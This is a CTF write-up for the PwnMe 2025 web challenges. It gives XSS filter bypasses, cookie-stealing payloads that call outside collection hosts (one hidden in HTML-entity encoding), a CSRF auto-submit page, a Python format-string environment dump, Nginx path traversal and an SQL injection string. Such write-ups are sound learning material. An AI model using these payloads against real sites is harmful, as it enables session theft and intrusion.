@@ -1,0 +1,336 @@
+---
+title: 'Pwnme CTF 2025 Writeup'
+date: '2025-03-05'
+tags: ['Writeup', 'Web']
+draft: false
+summary: 'Writeup for the web challenges in the Pwnme 2025 CTF. There is a very interesting account take over challenge in a black-box setting.'
+---
+
+## Hack the Bot - 1
+
+### **Vulnerability**
+
+XSS on search input box with the following restriction:
+
+- Split by `/[^\p{L}]+/u` and any words in the result cannot shown in the page
+- Cannot use any uppercase characters
+
+```python
+function searchArticles(searchInput = document.getElementById('search-input').value.toLowerCase().trim()) {
+    const searchWords = searchInput.split(/[^\p{L}]+/u);
+    const articles = document.querySelectorAll('.article-box');
+    let found = false;
+    articles.forEach(article => {
+        if (searchInput === '') {
+            article.style.display = '';
+            found = true;
+        } else {
+            const articleText = article.textContent.toLowerCase();
+            const isMatch = searchWords.some(word => word && new RegExp(`${word}`, 'ui').test(articleText));
+            if (isMatch) {
+                article.style.display = '';
+                found = true;
+            } else {
+                article.style.display = 'none';
+            }
+        }
+    });
+    const noMatchMessage = document.getElementById('no-match-message');
+    if (!found && searchInput) {
+        noMatchMessage.innerHTML = `No results for "${searchInput}".`;
+        noMatchMessage.style.display = 'block';
+    } else {
+        noMatchMessage.style.display = 'none';
+    }
+}
+```
+
+**PoC**
+
+The following payload triggers an XSS by leveraging the `oncontentvisibilityautostatechange` event and `content-visibility: auto` CSS property:
+
+```python
+https://hackthebot2-512f165761b6a6e8.deploy.phreaks.fr/?q=%3Cinput%20oncontentvisibilityautostatechange=confirm(1)%20style=content-visibility:auto%20type=hiddle%20%3E
+```
+
+### **Exploit**
+
+Constructing an exploit is challenging due to the imposed restrictions. The bot sets the cookie only after visiting the page, preventing direct fetching. We must wait and check periodically if the cookie is set. However, we cannot use `setInterval` or `setTimeout` (due to uppercase characters), nor can we use a busy-wait loop (`while`), as it would block `page.goto` from completing.
+
+```jsx
+const page = await browser.newPage();
+await page.goto(url);
+
+if (url.startsWith("http://localhost/")) {
+    await page.setCookie(cookie);
+}
+```
+
+**Bypassing the restriction**
+
+To bypass these limitations, we can first load an external JavaScript file into the context. Since the transformation process does not alter the functions inside the external script, we can use restricted functions like `setTimeout`.
+
+```python
+# Raw paylaod
+document.write(`<link rel=stylesheet href='//helpful-autumn-15.webhook.cool/?${document.cookie}'>`);
+
+# Cannot use script, src, http, etc.
+let temp='scriptxxsrc='.replace('xx', ' ');let temp2='scriptxx'.replace('xx', '');document.write(`<${temp}//idontknow.blackhat.day/exploit.js></${temp2}>`);
+```
+
+```python
+# Initial payload:
+<input oncontentvisibilityautostatechange="let temp='scriptxxsrc='.replace('xx', ' ');let temp2='scriptxx'.replace('xx', '');document.write(`<${temp}//idontknow.blackhat.day/exploit.js></${temp2}>`);`);" style=content-visibility:auto type=hiddle >
+
+# Scripe file:
+setTimeout(() => {
+  fetch(`https://helpful-autumn-15.webhook.cool/?${document.cookie}`);
+}, 5000);
+
+http://localhost/?q=%3Cinput%20oncontentvisibilityautostatechange=%22let%20temp=%27scriptxxxxxxsrc=%27.replace(%27xxxxxx%27,%20%27%20%27);let%20temp2=%27scriptxxxxxx%27.replace(%27xxxxxx%27,%20%27%27);document.write(`%3C${temp}//idontknow.blackhat.day/exploit.js%3E%3C/${temp2}%3E`);%22%20style=content-visibility:auto%20type=hiddle%20%3E
+```
+
+**Alternative Approach**
+
+I also saw some trick to bypass the uppercase restriction with `iframe`  + `srcdoc` + `html entity encoding` . It looks like the html entity encoded string will be automatically decoded first when using it in a JavaScript context parser like `document.write`.
+
+```jsx
+http://localhost/?q=<iframe srcdoc='%26%2360;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2362;%26%23115;%26%23101;%26%23116;%26%2384;%26%23105;%26%23109;%26%23101;%26%23111;%26%23117;%26%23116;%26%2340;%26%2340;%26%2340;%26%2341;%26%2332;%26%2361;%26%2362;%26%2332;%26%23123;%26%23108;%26%23111;%26%2399;%26%2397;%26%23116;%26%23105;%26%23111;%26%23110;%26%2361;%26%2339;%26%23104;%26%23116;%26%23116;%26%23112;%26%23115;%26%2358;%26%2347;%26%2347;%26%23101;%26%23111;%26%2353;%26%23102;%26%2348;%26%23113;%26%23104;%26%2397;%26%23102;%26%23117;%26%2353;%26%23120;%26%2353;%26%2348;%26%23107;%26%2346;%26%23109;%26%2346;%26%23112;%26%23105;%26%23112;%26%23101;%26%23100;%26%23114;%26%23101;%26%2397;%26%23109;%26%2346;%26%23110;%26%23101;%26%23116;%26%2347;%26%2339;%26%2343;%26%23100;%26%23111;%26%2399;%26%23117;%26%23109;%26%23101;%26%23110;%26%23116;%26%2346;%26%2399;%26%23111;%26%23111;%26%23107;%26%23105;%26%23101;%26%23125;%26%2341;%26%2344;%26%2332;%26%2349;%26%2348;%26%2348;%26%2348;%26%2341;%26%2360;%26%2347;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2362;'></iframe>
+
+or 
+http://localhost/?q=<iframe srcdoc='&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#115;&#101;&#116;&#84;&#105;&#109;&#101;&#111;&#117;&#116;&#40;&#40;&#40;&#41;&#32;&#61;&#62;&#32;&#123;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#101;&#111;&#53;&#102;&#48;&#113;&#104;&#97;&#102;&#117;&#53;&#120;&#53;&#48;&#107;&#46;&#109;&#46;&#112;&#105;&#112;&#101;&#100;&#114;&#101;&#97;&#109;&#46;&#110;&#101;&#116;&#47;&#39;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#125;&#41;&#44;&#32;&#49;&#48;&#48;&#48;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;'></iframe>
+```
+
+### **Flag**
+
+```python
+PWNME{D1d_y0U_S4iD-F1lt33Rs?}
+```
+
+## Say My Name
+
+### **Flawed XSS Sanitization**
+
+- The user-controlled directly propagate to the attribute’s script context, therefore the `>` , `<` sanitization is not useful.
+- `"` is escaped to `\\"` which is vulnerable, because attacker could inject an additional `\` to escape the added `\` . By using this trick, we can break the `“` context and achieve XSS.
+
+```jsx
+def sanitize_input(input_string):
+    input_string = input_string.replace('<', '')
+    input_string = input_string.replace('>', '')
+    input_string = input_string.replace('\'', '')
+    input_string = input_string.replace('&', '')
+    input_string = input_string.replace('"', '\\"')
+    input_string = input_string.replace(':', '')
+    return input_string
+    
+@app.route('/your-name', methods=['POST'])
+def your_name():
+    if request.method == 'POST':
+        name = request.form.get('name')
+        return Response(render_template('your-name.html', name=sanitize_input(name)), content_type='text/html')
+```
+
+```jsx
+</style>
+<div class="image-container">
+    <img src="{{ url_for('static', filename='images/cat.jpg') }}" alt="cat">
+    <a class="text" id="behindthename-redirect" href='https://www.behindthename.com/names/search.php?terms={{name}}' onfocus='document.location="https://www.behindthename.com/names/search.php?terms={{name|safe}}"'>Hello {{name}} !</a>
+</div>
+```
+
+**PoC**
+
+```jsx
+\";alert(1);//
+
+\";window.location=`//helpful-autumn-15.webhook.cool/?`+document.cookie;//
+```
+
+### **Exploit: Auto-focus + CSRF**
+
+The XSS is bound to the `onfocus` event. So, if we want to trigger the XSS automatically, we need to use the `#` anchor in the URL to achieve the auto-focus functionality because the `a` tag has a very nice `id` attribute.
+
+```jsx
+<a class="text" id="behindthename-redirect" ...>
+```
+
+CSRF Exploit Page:
+
+```jsx
+<html>
+  <body>
+    <form action="http://localhost/your-name#behindthename-redirect" method="POST" id="csrf-form">
+      <input type="hidden" name="name" value='\";alert(1);//' />
+    </form>
+
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
+```
+
+Got the admin token:
+
+```jsx
+X-Admin-Token=214d57ee72f9fd4a24f9effaaa5f7a47
+```
+
+### **Python Format String Vulnerability**
+
+```python
+from flask import Flask, render_template, request, Response, redirect, url_for
+
+def run_cmd(): # I will do that later
+    pass
+    
+@app.route('/admin', methods=['GET'])
+def admin():
+    if request.cookies.get('X-Admin-Token') != X_Admin_Token:
+        return 'Access denied', 403
+    
+    prompt = request.args.get('prompt')
+    return render_templ
+```
+
+Payload to retrieve the env variables:
+
+```python
+prompt = "{0.__globals__[render_template].__globals__[Template].render.__globals__[os].environ._data}"
+```
+
+### Flag
+
+```python
+PWNME{b492b312612c741b3b6597f925f88198}
+```
+
+### Additional Note
+
+According to the challenge author, this challenge is essentially about encoding differentials, as explained in the following article. However, they forgot to escape the `/` lol.
+
+https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
+
+This exploitation works when you control two parts of the HTML code: one to inject a decoding escape sequence and the other to inject the payload. This allows escape characters like `/` to be treated as normal code, e.g., `¥` in JIS X 0201 1976,  while the attacker-injected `"` regains its effect.
+
+Here is the author’s solve: [https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/sayMyName/solve/solver.py](https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/sayMyName/solve/solver.py)
+
+## Hack the Bot - 2
+
+I didn’t manage to solve this challenge during the game. I know it’s related to connecting to Chrome via the CDP remote debugging port. However, since the challenge doesn’t explicitly set the port using `--remote-debugging-port`, I wasn’t aware that I could leak it from the browser’s user data folder.
+
+### Vulnerability
+
+The setup of this challenge is that you can let the puppeter visit any website. And the browser is started in the following way. You goal is to read a local file under the source code folder.
+
+```jsx
+const logPath = '/tmp/bot_folder/logs/';
+const browserCachePath = '/tmp/bot_folder/browser_cache/';
+
+const browser = await puppeteer.launch({
+    headless: 'new',
+    args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
+});
+```
+
+**Misconfiguration in Nginx**
+
+The Nginx configuration is misconfigured as follows, allowing for a one-layer path traversal: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)
+
+```jsx
+http {
+    server {
+        listen 80;
+
+        location / {
+            proxy_pass http://127.0.0.1:5000;
+        }
+
+        location /logs {
+            autoindex off;
+            alias /tmp/bot_folder/logs/;
+            try_files $uri $uri/ =404;
+        }
+    }
+}
+```
+
+With this vulnerability, we could read the content under the `browserCachePath` path and remote debugging port is located at `DevToolsActivePort` file.
+
+### Exploitation
+
+Next, we can interact with DevTools through the CDP protocol using a WebSocket to read the file and exfiltrate its contents.
+
+Here’s the exploitation script from player @**TechnologicNick**:
+
+[https://discord.com/channels/984864944707227769/1334271909419946034/1345804539193852007](https://discord.com/channels/984864944707227769/1334271909419946034/1345804539193852007)
+
+## **Crackford**
+
+> This is a website without many features. You can only create and log in to your account.
+>
+>
+> You must take control of the administrator account
+
+### Analyzing the Password Reset Token
+
+The password reset token algorithm appears to be predictable, allowing us to reset the admin’s password. The goal is to understand how the token is generated (which is really hard).
+
+The post request only contains the following field and it will return the password reset token associated with the account.
+
+```jsx
+{"username":"-1","email":"hello@hulk-1.com"}
+nbswy8dp1buhk8dIfuys5y8pnv6dcnr7pr1f07sn1uq3gvcg
+```
+
+Here are some aspects that can be considered:
+
+- Field Factors
+
+    - The token appears to follow a predictable pattern:
+
+        ```jsx
+        {"username":"-1","email":"hello6@hulk-6.com"}
+        nbswy8dpgzAgq4Imnmw7mI7dn4wxymjwgn6fAv90jvcsAq9u1g
+        
+        {"username":"-1","email":"hello6@hulk-7.com"}
+        nbswy8dpgzAgq4Imnmw70I7dn4wxymjwgr6fAv90jvcsAq9u1g
+        
+        {"username":"-10086","email":"hello6@hulk-8.com"}
+        nbswy8dpgzAgq4Imnmw7qI7dn4wxymjwgv6fAv90jvcsAq9u1g
+        ```
+
+    - Changing the email length significantly increases the token length. However, the username does not affect it. (Good observation from the challenge author.)
+
+- Alphabet Analysis
+
+    - Replacing certain parts of the token with random characters sometimes returns a `500` error and other times a `404` error.
+    - This suggests that only a specific alphabet is used to generate the token.
+
+### Guess the Algorithm
+
+Following the alphabet analysis, we can try to construct the used alphabet table.
+
+```jsx
+def get_used_chars(input):
+    c_unique = set()
+    for c in input:
+        c_unique.add(c)
+    l = list(c_unique)
+    l.sort()
+    return l
+
+chaine = "mfrggzdfmz7wq9Iknnwg987p0byx358u0v8h06dzp1ydcmr7gq97mnzyhfp7s0bxgy971mzsg3yhu6Iy048hk4d70jyxA880nvwgw97jnb7wmzI3mnrgcx9b1jbu1rkg1433sssIjrgu579qkfjfgvcvkzIvqwk91bwwc9Imfz7h32brgy8hyucxjzguk1cdkrdA"
+print("".join(get_used_chars(chaine))) # 0123456789AIbcdfghjkmnpqrsuvwxyz
+```
+
+The alphabet’s length is 32, which means the token could be using the Base32 algorithm with a custom alphabet.
+
+The later part could just following the challenge author’s writeup: [https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/Crackford/solve/README.md#reconstructing-the-encoding-algorithm](https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/Crackford/solve/README.md#reconstructing-the-encoding-algorithm)
+
+### SQLi
+
+Once we find the token generation algorithm, we know the format of the message of being encoded: `email|id|PWNME CTF` .
+
+During the token verification phase, the server would retrieve the `id` field and look up in the database which leads to the SQL injection attack. For example, `email@test.com|id' or 1--|PWNME CTF` returns a valid account.
